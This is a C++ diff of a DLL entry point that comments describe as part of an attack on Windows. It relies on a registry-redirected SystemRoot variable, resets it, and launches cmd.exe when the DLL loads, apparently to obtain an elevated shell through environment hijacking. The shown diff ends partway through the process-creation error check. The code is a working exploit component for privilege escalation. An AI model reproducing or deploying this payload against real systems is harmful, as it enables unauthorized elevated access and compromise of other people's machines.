@@ -5,8 +5,7 @@
 BOOL WINAPI DllMain(
 	HINSTANCE,
 	DWORD callReason,
-	LPVOID
-)
+	LPVOID)
 {
 	if (callReason == DLL_PROCESS_ATTACH)
 	{
@@ -22,18 +21,23 @@ BOOL WINAPI DllMain(
 			ExitProcess(static_cast<DWORD>(hr));
 		}
 
-		std::wstring systemPath{ szPath };
+		std::wstring systemPath{szPath};
 		CoTaskMemFree(szPath);
 
+		/* Remember, the SystemRoot env. variable is still the custom location, so set it back to the real location
+		for this process, the main attack executable will undo the registry changes. */
+
+		/* Even if the registry change is undone, the child cmd.exe will inherit our SystemRoot which is why we need
+		to set it back to the default location. */
 		const auto result = SetEnvironmentVariableW(L"systemroot", szWindowsDir);
 		CoTaskMemFree(szWindowsDir);
 		if (!result)
 			ExitProcess(GetLastError());
-		
+
 		systemPath += L"\\cmd.exe";
 
 		PROCESS_INFORMATION processInfo;
-		STARTUPINFOW startupInfo{ sizeof STARTUPINFOW, nullptr };
+		STARTUPINFOW startupInfo{sizeof STARTUPINFOW, nullptr};
 
 		if (!CreateProcessW(systemPath.c_str(), nullptr, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &startupInfo,
 		                    &processInfo))
